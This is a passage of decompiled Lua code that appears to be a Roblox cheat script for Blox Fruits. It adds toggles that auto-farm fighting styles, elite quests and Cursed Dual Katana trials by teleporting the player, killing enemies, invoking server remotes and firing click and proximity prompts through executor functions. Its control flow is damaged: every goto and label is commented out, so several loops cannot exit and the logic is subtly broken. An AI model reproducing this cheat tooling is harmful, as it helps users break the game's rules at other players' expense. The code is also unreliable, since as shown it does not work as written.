                            until not _G.Auto_SharkMan_Karate or Root.Position == CFrame.new(- 2604.6958, 239.432526, - 10315.1982, 0.0425701365, 0, - 0.999093413, 0, 1, 0, 0.999093413, 0, 0.0425701365).Position
                            replicated.Remotes.CommF_:InvokeServer("BuySharkmanKarate")
                        end
						-- goto l3
                    end
                    if GetBP("Water Key") then
						-- goto l3
                    end
                    local v514 = GetConnectionEnemies("Tide Keeper")
                    if v514 then
                        wait()
                        vu28.Kill(v514, _G.Auto_SharkMan_Karate)
                        if not v514.Parent or (v514.Humanoid.Health <= 0 or (_G.Auto_SharkMan_Karate == false or (GetBP("Water Key") or GetBP("Sharkman Karate")))) then
							-- goto l3
                        end
                    end
                    _tp(CFrame.new(- 3053.9814453125, 237.18954467773, - 10145.0390625))
                end
				-- ::l3::
            end)
        end
    end
end)
v226.Melee:AddToggle("ElectricClaw", {
    ["Title"] = "Auto ElectricClaw",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p515)
    _G.Auto_Electric_Claw = p515
end)
spawn(function()
    while wait(Sec) do
        if _G.Auto_Electric_Claw then
            pcall(function()
                if plr:FindFirstChild("WeaponAssetCache") then
                    if not GetBP("Electro") then
                        replicated.Remotes.CommF_:InvokeServer("BuyElectro")
                    end
                    if GetBP("Electro") and GetBP("Electro").Level.Value >= 400 then
                        if replicated.Remotes.CommF_:InvokeServer("BuyElectricClaw", "Start") == nil then
                            notween(CFrame.new(- 12548, 337, - 7481))
                        end
                        replicated.Remotes.CommF_:InvokeServer("BuyElectricClaw")
                    elseif GetBP("Electro") and GetBP("Electro").Level.Value < 400 then
                        repeat
                            _G.AutoFarm_Bone = true
                            wait()
                        until not _G.Auto_Electric_Claw or GetBP("Electric Claw")
                        _G.AutoFarm_Bone = false
                    end
                end
            end)
        end
    end
end)
v226.Melee:AddToggle("DragonTalon", {
    ["Title"] = "Auto DragonTalon",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p516)
    _G.AutoDragonTalon = p516
end)
spawn(function()
    while wait(Sec) do
        if _G.AutoDragonTalon then
            pcall(function()
                if plr:FindFirstChild("WeaponAssetCache") then
                    if not GetBP("Dragon Claw") then
                        replicated.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2")
                    end
                    if GetBP("Dragon Claw") and GetBP("Dragon Claw").Level.Value >= 400 then
                        replicated.Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1)
                        replicated.Remotes.CommF_:InvokeServer("BuyDragonTalon")
                    elseif GetBP("Dragon Claw") and GetBP("Dragon Claw").Level.Value < 400 then
                        repeat
                            _G.AutoFarm_Bone = true
                            wait()
                        until not _G.AutoDragonTalon or GetBP("Dragon Talon")
                        _G.AutoFarm_Bone = false
                    end
                end
            end)
        end
    end
end)
v226.Melee:AddToggle("Godhuman", {
    ["Title"] = "Auto Godhuman",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p517)
    _G.Auto_God_Human = p517
end)
spawn(function()
    while wait() do
        pcall(function()
            if _G.AutoGodHuman then
                if replicated.Remotes.CommF_:InvokeServer("BuyGodhuman", true) ~= "Bring me 20 Fish Tails, 20 Magma Ore, 10 Dragon Scales and 10 Mystic Droplets." then
                    if replicated.Remotes.CommF_:InvokeServer("BuyGodhuman", true) == 3 then
                        return nil
                    end
                    replicated.Remotes.CommF_:InvokeServer("BuyGodhuman")
                elseif GetM("Dragon Scale") == false or GetM("Dragon Scale") < 10 then
                    if World3 then
                        Lv = 1575
                        _G.Level = true
                    else
                        replicated.Remotes.CommF_:InvokeServer("TravelZou")
                    end
                elseif GetM("Fish Tail") == false or GetM("Fish Tail") < 20 then
                    if World3 then
                        Lv = 1775
                        _G.Level = true
                    else
                        replicated.Remotes.CommF_:InvokeServer("TravelZou")
                    end
                elseif GetM("Mystic Droplet") == false or GetM("Mystic Droplet") < 10 then
                    if World2 then
                        Lv = 1425
                        _G.Level = true
                    else
                        replicated.Remotes.CommF_:InvokeServer("TravelDressrosa")
                    end
                elseif GetM("Magma Ore") == false or GetM("Magma Ore") < 20 then
                    if World2 then
                        Lv = 1175
                        _G.Level = true
                    else
                        replicated.Remotes.CommF_:InvokeServer("TravelDressrosa")
                    end
                end
            end
        end)
    end
end)
v226.Melee:AddToggle("SanguineArt", {
    ["Title"] = "Auto SanguineArt",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p518)
    _G.snaguine = p518
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.snaguine then
            pcall(function()
				-- upvalues: (ref) vu28
                if not GetBP("Sanguine Art") then
                    replicated.Remotes.CommF_:InvokeServer("Sanguine Art")
                end
                if GetBP("Sanguine Art") then
                    replicated.Remotes.CommF_:InvokeServer("BuySanguineArt")
                else
                    if GetM("Leviathan Heart") < 1 then
                        if World3 then
                            _G.DangerSc = "Lv Infinite"
                            _G.SailBoats = true
                        else
                            _G.SailBoats = false
                        end
                    else
                        print("Completed!!")
                    end
                    if GetM("Vampire Fang") <= 19 then
                        if World2 then
                            local v519 = GetConnectionEnemies("Vampire")
                            if v519 then
                                repeat
                                    task.wait()
                                    vu28.Kill(v519, _G.snaguine)
                                until not _G.snaguine or (v519.Humanoid.Health <= 0 or not v519.Parent)
                            else
                                _tp(CFrame.new(- 6041.2924804688, 6.4027109146118, - 1304.6333007812))
                            end
                        else
                            replicated.Remotes.CommF_:InvokeServer("TravelDressrosa")
                        end
                    end
                    if GetM("Vampire Fang") >= 20 and GetM("Demonic Wisp") <= 19 then
                        if World3 then
                            local v520 = GetConnectionEnemies("Demonic Soul")
                            if v520 then
                                task.wait()
                                vu28.Kill(v520, _G.snaguine)
                                if not _G.snaguine or (v520.Humanoid.Health <= 0 or not v520.Parent) then
									-- goto l31
                                end
                            end
                            _tp(CFrame.new(- 9495.6806640625, 453.58624267578, 5977.3486328125))
                        else
                            replicated.Remotes.CommF_:InvokeServer("TravelZou")
                        end
                    end
					-- ::l31::
                    if GetM("Vampire Fang") < 20 or (GetM("Demonic Wisp") < 20 or GetM("Dark Fragment") > 1) then
						-- goto l47
                    end
                    if World2 then
                        if GetConnectionEnemies("Darkbeard") then
                            task.wait()
                            vu28.Kill(black, _G.snaguine)
                            if _G.snaguine or (black.Humanoid.Health <= 0 or not black.Parent) then
								-- goto l47
                            end
                        end
                        _tp(CFrame.new(3798.4575195313, 13.826690673828, - 3399.806640625))
                    else
                        replicated.Remotes.CommF_:InvokeServer("TravelDressrosa")
                    end
                end
				-- ::l47::
            end)
        end
    end
end)
v226.Quests:AddSection("Tushita + Yama")
local vu521 = v226.Quests:AddParagraph({
    ["Title"] = "Elites Process ",
    ["Content"] = ""
})
spawn(function()
	-- upvalues: (ref) vu521
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu521
            vu521:SetDesc("Elite Procress :  " .. replicated.Remotes.CommF_:InvokeServer("EliteHunter", "Progress"))
        end)
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Elite Quest",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p522)
    _G.FarmEliteHunt = p522
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.FarmEliteHunt then
                if plr.PlayerGui.Main.Quest.Visible ~= true then
                    replicated.Remotes.CommF_:InvokeServer("EliteHunter")
                elseif string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Diablo") or (string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Urban") or string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Deandre")) then
                    local v523, v524, v525 = pairs(replicated:GetChildren())
                    while true do
                        local v526
                        v525, v526 = v523(v524, v525)
                        if v525 == nil then
                            break
                        end
                        if string.find(v526.Name, "Diablo") or (string.find(v526.Name, "Urban") or string.find(v526.Name, "Deandre")) then
                            _tp(v526.HumanoidRootPart.CFrame)
                        end
                    end
                    local v527, v528, v529 = pairs(Enemies:GetChildren())
                    while true do
                        local v530
                        v529, v530 = v527(v528, v529)
                        if v529 == nil then
                            break
                        end
                        if (string.find(v530.Name, "Diablo") or (string.find(v530.Name, "Urban") or string.find(v530.Name, "Deandre"))) and vu28.Alive(v530) then
                            repeat
                                wait()
                                vu28.Kill(v530, _G.FarmEliteHunt)
                            until not _G.FarmEliteHunt or (plr.PlayerGui.Main.Quest.Visible == false or (not v530.Parent or v530.Humanoid.Health <= 0))
                        end
                    end
                end
            end
        end)
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Stop when got God\'s Chalice",
    ["Description"] = "",
    ["Default"] = true
}):OnChanged(function(p531)
    _G.StopWhenChalice = p531
end)
spawn(function()
    while wait(0.2) do
        if _G.StopWhenChalice and _G.FarmEliteHunt then
            pcall(function()
                if GetBP("God\'s Chalice") or (GetBP("Sweet Chalice") or GetBP("Fist of Darkness")) then
                    _G.FarmEliteHunt = false
                end
            end)
        end
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Tushita Sword",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p532)
    _G.Auto_Tushita = p532
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.Auto_Tushita then
                if workspace.Map.Turtle:FindFirstChild("TushitaGate") then
                    if GetBP("Holy Torch") then
                        EquipWeapon("Holy Torch")
                        task.wait(1)
                        repeat
                            task.wait()
                            _tp(CFrame.new(- 10752, 417, - 9366))
                        until not _G.Auto_Tushita or (CFrame.new(- 10752, 417, - 9366).Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10
                        wait(0.7)
                        repeat
                            task.wait()
                            _tp(CFrame.new(- 11672, 334, - 9474))
                        until not _G.Auto_Tushita or (CFrame.new(- 11672, 334, - 9474).Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10
                        wait(0.7)
                        repeat
                            task.wait()
                            _tp(CFrame.new(- 12132, 521, - 10655))
                        until not _G.Auto_Tushita or (CFrame.new(- 12132, 521, - 10655).Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10
                        wait(0.7)
                        repeat
                            task.wait()
                            _tp(CFrame.new(- 13336, 486, - 6985))
                        until not _G.Auto_Tushita or (CFrame.new(- 13336, 486, - 6985).Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10
                        wait(0.7)
                        repeat
                            task.wait()
                            _tp(CFrame.new(- 13489, 332, - 7925))
                        until not _G.Auto_Tushita or (CFrame.new(- 13489, 332, - 7925).Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10
                    else
                        _tp(CFrame.new(5148.03613, 162.352493, 910.548218))
                        wait(0.7)
                    end
                else
                    local v533 = GetConnectionEnemies("Longma")
                    if v533 then
                        repeat
                            task.wait()
                            vu28.Kill(v533, _G.Auto_Tushita)
                        until v533.Humanoid.Health <= 0 or not (_G.Auto_Tushita and v533.Parent)
                    elseif replicated:FindFirstChild("Longma") then
                        _tp(replicated:FindFirstChild("Longma").HumanoidRootPart.CFrame * CFrame.new(0, 40, 0))
                    end
                end
            end
        end)
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Yama Sword",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p534)
    _G.Auto_Yama = p534
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.Auto_Yama then
                if replicated.Remotes.CommF_:InvokeServer("EliteHunter", "Progress") >= 30 then
                    if replicated.Remotes.CommF_:InvokeServer("EliteHunter", "Progress") > 30 then
                        _G.FarmEliteHunt = false
                        if (workspace.Map.Waterfall.SealedKatana.Handle.Position - plr.Character.HumanoidRootPart.Position).Magnitude >= 20 then
                            _tp(workspace.Map.Waterfall.SealedKatana.Handle.CFrame)
                            local v535 = GetConnectionEnemies("Ghost")
                            if v535 then
                                repeat
                                    wait()
                                    vu28.Kill(v535, _G.Auto_Yama)
                                until v535.Humanoid.Health <= 0 or not (v535.Parent and _G.Auto_Yama)
                                fireclickdetector(workspace.Map.Waterfall.SealedKatana.Handle.ClickDetector)
                            end
                        end
                    end
                else
                    _G.FarmEliteHunt = true
                end
            end
        end)
    end
end)
v226.Quests:AddSection("Cursed Dual Katana")
local vu536 = v226.Quests:AddParagraph({
    ["Title"] = " Number Cursed dual katana quests ",
    ["Content"] = "Quest Numbers :"
})
spawn(function()
	-- upvalues: (ref) vu536
    while wait(0.2) do
        if QuestYama_1 ~= true then
            if QuestYama_2 ~= true then
                if QuestYama_3 ~= true then
                    if QuestTushita_1 ~= true then
                        if QuestTushita_2 ~= true then
                            if QuestTushita_1 ~= true then
                                if GetWP("Cursed Dual Katana") then
                                    vu536:SetDesc(" Quest Numbers: CDK done!!")
                                end
                            else
                                vu536:SetDesc(" Quest Numbers: tushita quest 2")
                            end
                        else
                            vu536:SetDesc(" Quest Numbers : tushita quest 2")
                        end
                    else
                        vu536:SetDesc(" Quest Numbers : tushita quest 1")
                    end
                else
                    vu536:SetDesc(" Quest Numbers : yama quest 3")
                end
            else
                vu536:SetDesc(" Quest Numbers : yama quest 2")
            end
        else
            vu536:SetDesc(" Quest Numbers : yama quest 1")
        end
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Get CDK [ Last Quest ]",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p537)
    _G.CDK = p537
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.CDK then
                replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Good")
                replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Evil")
                replicated.Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Boss")
                local v538 = GetConnectionEnemies("Cursed Skeleton Boss")
                if v538 then
                    while true do
                        if true then
                            wait()
                            if plr.Character:FindFirstChild("Yama") or plr.Backpack:FindFirstChild("Yama") then
                                EquipWeapon("Yama")
                            elseif plr.Character:FindFirstChild("Tushita") or plr.Backpack:FindFirstChild("Tushita") then
                                EquipWeapon("Tushita")
                            end
                        end
                        _tp(v538.HumanoidRootPart.CFrame * CFrame.new(0, 20, 0))
                        if not _G.CDK or (not v538.Parent or v538.Humanoid.Health <= 0) then
							-- goto l3
                        end
                    end
                end
                _tp(CFrame.new(- 12318.193359375, 601.95184326172, - 6538.662109375))
                wait(0.5)
                _tp(workspace.Map.Turtle.Cursed.BossDoor.CFrame)
            end
			-- ::l3::
        end)
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Yama CDK",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p539)
    _G.CDK_YM = p539
end)
spawn(function()
	-- upvalues: (ref) vu17, (ref) vu28
    while wait() do
        pcall(function()
			-- upvalues: (ref) vu17, (ref) vu28
			-- block 145
            if not _G.CDK_YM then
				-- ::l3::
                return
            end
            if tostring(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "OpenDoor")) ~= "opened" then
                replicated.Remotes.CommF_:InvokeServer("CDKQuest", "OpenDoor")
                replicated.Remotes.CommF_:InvokeServer("CDKQuest", "OpenDoor", true)
				-- goto l3
            end
            if replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Finished == nil then
                replicated.Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Evil")
                replicated.Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Evil")
				-- goto l3
            end
            if replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Finished ~= false then
				-- goto l3
            end
            if tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) == - 3 then
                QuestYama_1 = true
                QuestYama_2 = false
                QuestYama_3 = false
                while true do
                    if true then
                        task.wait()
                        if workspace.Enemies:FindFirstChild("Forest Pirate") then
                            if GetConnectionEnemies("Forest Pirate") then
                                _tp(workspace.Enemies:FindFirstChild("Forest Pirate").HumanoidRootPart.CFrame)
                            end
                        else
                            _tp(CFrame.new(- 13223.521484375, 428.19381713867, - 7766.0678710938))
                        end
                    end
                    if tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) == 1 or not _G.CDK_YM then
						-- goto l3
                    end
                end
            end
            if tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) == - 4 then
                QuestYama_1 = false
                QuestYama_2 = true
                QuestYama_3 = false
                local v540, v541, v542 = pairs(game:GetService("Players").LocalPlayer.QuestHaze:GetChildren())
                while true do
                    local v543
                    v542, v543 = v540(v541, v542)
                    if v542 == nil then
                        break
                    end
                    local v544, v545, v546 = pairs(vu17)
                    while true do
                        local v547
                        v546, v547 = v544(v545, v546)
                        if v546 == nil then
                            break
                        end
                        if string.find(v546, v543.Name) and v543.Value > 0 then
                            if (v547.Position - Root.Position).Magnitude > 1000 or not workspace.Enemies:FindFirstChild(v546) then
                                _tp(v547)
                            else
                                local v548, v549, v550 = pairs(workspace.Enemies:GetChildren())
                                while true do
                                    local v551
                                    v550, v551 = v548(v549, v550)
                                    if v550 == nil then
                                        break
                                    end
                                    if v551:FindFirstChild("HumanoidRootPart") and (v551:FindFirstChild("Humanoid") and (v551:FindFirstChild("Humanoid").Health > 0 and v551:FindFirstChild("HazeESP"))) then
                                        repeat
                                            wait()
                                            vu28.Kill(v551, _G.CDK_YM)
                                        until not _G.CDK_YM or (tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) == 2 or (not v551:FindFirstChild("HazeESP") or v551.Humanoid.Health <= 0))
                                    end
                                end
                            end
                        end
                    end
                end
				-- goto l3
            end
            if tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) ~= - 5 then
				-- goto l3
            end
            QuestYama_1 = false
            QuestYama_2 = false
            QuestYama_3 = true
            if not workspace.Map:FindFirstChild("HellDimension") or (Root.Position - workspace.Map.HellDimension.Spawn.Position).Magnitude > 1000 then
				-- goto l3
            end
            local v552, v553, v554 = pairs(workspace.Map.HellDimension.Exit:GetChildren())
            while true do
                local v555
                v554, v555 = v552(v553, v554)
                if v554 == nil then
                    break
                end
                if tonumber(v554) == 2 then
                    repeat
                        task.wait()
                        Root.CFrame = workspace.Map.HellDimension.Exit.CFrame
                    until not _G.CDK_YM or tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) == 3
                end
            end
            EquipWeapon(_G.SelectWeapon)
            if tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) == 3 then
				-- ::l81::
                local v556, v557, v558 = pairs(workspace.Enemies:GetChildren())
                while true do
                    local v559
                    v558, v559 = v556(v557, v558)
                    if v558 == nil then
                        break
                    end
                    if (v559:FindFirstChild("HumanoidRootPart").Position - workspace.Map.HellDimension.Spawn.Position).Magnitude <= 300 and (v559:FindFirstChild("HumanoidRootPart") and (v559:FindFirstChild("Humanoid") and v559:FindFirstChild("Humanoid").Health > 0)) then
                        repeat
                            task.wait()
                            vu28.Kill(v559, _G.CDK_YM)
                        until not _G.CDK_YM or (v559.Humanoid.Health <= 0 or not v559.Parent) or tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) == 3
                    end
                end
				-- goto l3
            end
			-- goto l80
			-- ::l90::
            task.wait()
            _tp(workspace.Map.HellDimension.Torch1.Particles.CFrame)
            local v560, v561, v562 = pairs(workspace.Map.HellDimension:GetDescendants())
            while true do
                local v563
                v562, v563 = v560(v561, v562)
                if v562 == nil then
                    break
                end
                if v563:IsA("ProximityPrompt") then
                    fireproximityprompt(v563)
                end
            end
            if (workspace.Map.HellDimension.Torch1.Particles.Position - Root.Position).Magnitude >= 5 then
				-- goto l90
            end
            wait(2)
            _G.T1Yama = true
            if _G.CDK_YM and not _G.T1Yama and tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) ~= 3 then
				-- ::l80::
                task.wait()
				-- goto l90
            end
			-- goto l93
			-- ::l105::
            task.wait()
            _tp(workspace.Map.HellDimension.Torch2.Particles.CFrame)
            local v564, v565, v566 = pairs(workspace.Map.HellDimension:GetDescendants())
            while true do
                local v567
                v566, v567 = v564(v565, v566)
                if v566 == nil then
                    break
                end
                if v567:IsA("ProximityPrompt") then
                    fireproximityprompt(v567)
                end
            end
            if (workspace.Map.HellDimension.Torch2.Particles.Position - Root.Position).Magnitude >= 5 then
				-- goto l105
            end
            wait(2)
            _G.T2Yama = true
            if not _G.T2Yama and _G.CDK_YM ~= false and tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) ~= 3 then
				-- ::l93::
                task.wait()
				-- goto l105
            end
			-- goto l108
			-- ::l120::
            task.wait()
            _tp(workspace.Map.HellDimension.Torch3.Particles.CFrame)
            local v568, v569, v570 = pairs(workspace.Map.HellDimension:GetDescendants())
            while true do
                local v571
                v570, v571 = v568(v569, v570)
                if v570 == nil then
                    break
                end
                if v571:IsA("ProximityPrompt") then
                    fireproximityprompt(v571)
                end
            end
            if (workspace.Map.HellDimension.Torch3.Particles.Position - Root.Position).Magnitude >= 5 then
				-- goto l120
            end
            wait(2)
            _G.T3Yama = true
            if _G.T3Yama or _G.CDK_YM == false or tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) == 3 then
				-- goto l81
            end
			-- ::l108::
            wait()
			-- goto l120
        end)
    end
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait() do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.CDK_YM and (tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) == - 5 and (not workspace.Map:FindFirstChild("HellDimension") or (Root.Position - workspace.Map.HellDimension.Spawn.Position).Magnitude > 1000)) then
                local v572 = GetConnectionEnemies("Soul Reaper")
                if v572 then
                    repeat
                        task.wait()
                        _tp(v572.HumanoidRootPart.CFrame)
                    until v572.Humanoid.Health <= 0 or not (_G.CDK_YM and v572.Parent) or (tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) == 3 or workspace.Map:FindFirstChild("HellDimension") and (Root.Position - workspace.Map.HellDimension.Spawn.Position).Magnitude <= 1000)
                elseif plr.Backpack:FindFirstChild("Hallow Essence") or plr.Character:FindFirstChild("Hallow Essence") then
                    repeat
                        _tp(CFrame.new(- 8932.322265625, 146.83154296875, 6062.55078125))
                        task.wait()
                    until (CFrame.new(- 8932.322265625, 146.83154296875, 6062.55078125).Position - Root.Position).Magnitude <= 8
                    EquipWeapon("Hallow Essence")
                elseif replicated:FindFirstChild("Soul Reaper") and replicated:FindFirstChild("Soul Reaper").Humanoid.Health > 0 then
                    _tp(replicated:FindFirstChild("Soul Reaper").HumanoidRootPart.CFrame)
                elseif replicated.Remotes.CommF_:InvokeServer("Bones", "Check") >= 50 or (workspace.Enemies:FindFirstChild("Soul Reaper") or (replicated:FindFirstChild("Soul Reaper") or workspace.Map:FindFirstChild("HellDimension"))) then
                    replicated.Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1)
                elseif workspace.Enemies:FindFirstChild("Reborn Skeleton") or (workspace.Enemies:FindFirstChild("Living Zombie") or (workspace.Enemies:FindFirstChild("Domenic Soul") or workspace.Enemies:FindFirstChild("Posessed Mummy"))) then
                    local v573, v574, v575 = pairs(workspace.Enemies:GetChildren())
                    while true do
                        local v576
                        v575, v576 = v573(v574, v575)
                        if v575 == nil then
                            break
                        end
                        if (v576.Name == "Reborn Skeleton" or (v576.Name == "Living Zombie" or (v576.Name == "Demonic Soul" or v576.Name == "Posessed Mummy"))) and (v576:FindFirstChild("HumanoidRootPart") and (v576:FindFirstChild("Humanoid") and v576:FindFirstChild("Humanoid").Health > 0)) then
                            repeat
                                task.wait()
                                vu28.Kill(v576, _G.CDK_YM)
                            until not _G.CDK_YM or (v576.Humanoid.Health <= 0 or not v576.Parent)
                        end
                    end
                else
                    _tp(CFrame.new(- 9515.2255859375, 164.00622558594, 5785.3833007812))
                end
            end
        end)
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Tushita CDK",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p577)
    _G.CDK_TS = p577
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait() do
        pcall(function()
			-- upvalues: (ref) vu28
			-- block 150
            if not _G.CDK_TS then
				-- ::l3::
                return
            end
            if tostring(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "OpenDoor")) ~= "opened" then
                wait(0.7)
                replicated.Remotes.CommF_:InvokeServer("CDKQuest", "OpenDoor")
                wait(0.3)
                replicated.Remotes.CommF_:InvokeServer("CDKQuest", "OpenDoor", true)
				-- goto l3
            end
            if replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Finished == nil then
                replicated.Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Good")
				-- goto l3
            end
            if replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Finished ~= false then
				-- goto l3
            end
            if tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) == - 3 then
                QuestTushita_1 = true
                QuestTushita_2 = false
                QuestTushita_3 = false
                repeat
                    wait()
                    _tp(CFrame.new(- 4602.5107421875, 16.446542739868, - 2880.998046875))
                until (CFrame.new(- 4602.5107421875, 16.446542739868, - 2880.998046875).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 or not _G.CDK_TS or tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) == 1
                if (CFrame.new(- 4602.5107421875, 16.446542739868, - 2880.998046875).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                    wait(0.7)
                    replicated.Remotes.CommF_:InvokeServer("CDKQuest", "BoatQuest", workspace.NPCs:FindFirstChild("Luxury Boat Dealer"), "Check")
                    wait(0.5)
                    replicated.Remotes.CommF_:InvokeServer("CDKQuest", "BoatQuest", workspace.NPCs:FindFirstChild("Luxury Boat Dealer"))
                end
                wait(1)
                repeat
                    wait()
                    _tp(CFrame.new(4001.1853027344, 10.089399337769, - 2654.86328125))
                until (CFrame.new(4001.1853027344, 10.089399337769, - 2654.86328125).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 or not _G.CDK_TS or tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) == 1
                if (CFrame.new(4001.1853027344, 10.089399337769, - 2654.86328125).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                    wait(0.7)
                    replicated.Remotes.CommF_:InvokeServer("CDKQuest", "BoatQuest", workspace.NPCs:FindFirstChild("Luxury Boat Dealer"), "Check")
                    wait(0.5)
                    replicated.Remotes.CommF_:InvokeServer("CDKQuest", "BoatQuest", workspace.NPCs:FindFirstChild("Luxury Boat Dealer"))
                end
                wait(1)
                repeat
                    wait()
                    _tp(CFrame.new(- 9530.763671875, 7.2452087402344, - 8375.5087890625))
                until (CFrame.new(- 9530.763671875, 7.2452087402344, - 8375.5087890625).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 or not _G.CDK_TS or tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) == 1
                if (CFrame.new(- 9530.763671875, 7.2452087402344, - 8375.5087890625).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                    wait(0.7)
                    replicated.Remotes.CommF_:InvokeServer("CDKQuest", "BoatQuest", workspace.NPCs:FindFirstChild("Luxury Boat Dealer"), "Check")
                    wait(0.5)
                    replicated.Remotes.CommF_:InvokeServer("CDKQuest", "BoatQuest", workspace.NPCs:FindFirstChild("Luxury Boat Dealer"))
                end
                wait(1)
				-- goto l3
            end
            if tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) == - 4 then
                QuestTushita_1 = false
                QuestTushita_2 = true
                QuestTushita_3 = false
                repeat
                    wait()
                    _G.AutoRaidCastle = true
                until not _G.CDK_TS or tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) == 2
                _G.AutoRaidCastle = false
				-- goto l3
            end
            if tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) ~= - 5 then
				-- goto l3
            end
            QuestTushita_1 = false
            QuestTushita_2 = false
            QuestTushita_3 = true
            if workspace.Enemies:FindFirstChild("Cake Queen") then
                local v578, v579, v580 = pairs(workspace.Enemies:GetChildren())
                while true do
                    local v581
                    v580, v581 = v578(v579, v580)
                    if v580 == nil then
                        break
                    end
                    if v581.Name == "Cake Queen" and (v581:FindFirstChild("Humanoid") and (v581:FindFirstChild("HumanoidRootPart") and v581.Humanoid.Health > 0)) then
                        repeat
                            wait()
                            vu28.Kill(v581, _G.CDK_TS)
                        until not _G.CDK_TS or (not v581.Parent or v581.Humanoid.Health <= 0) or tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) == 3
                    end
                end
				-- goto l3
            end
            if replicated:FindFirstChild("Cake Queen") and replicated:FindFirstChild("Cake Queen").Humanoid.Health > 0 then
                _tp(replicated:FindFirstChild("Cake Queen").HumanoidRootPart.CFrame * CFrame.new(0, 30, 0))
				-- goto l3
            end
            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - workspace.Map.HeavenlyDimension.Spawn.Position).Magnitude > 1000 then
				-- goto l3
            end
            local v582, v583, v584 = pairs(workspace.Map.HeavenlyDimension.Exit:GetChildren())
            while true do
                local v585
                v584, v585 = v582(v583, v584)
                if v584 == nil then
                    break
                end
                Ex = v584
            end
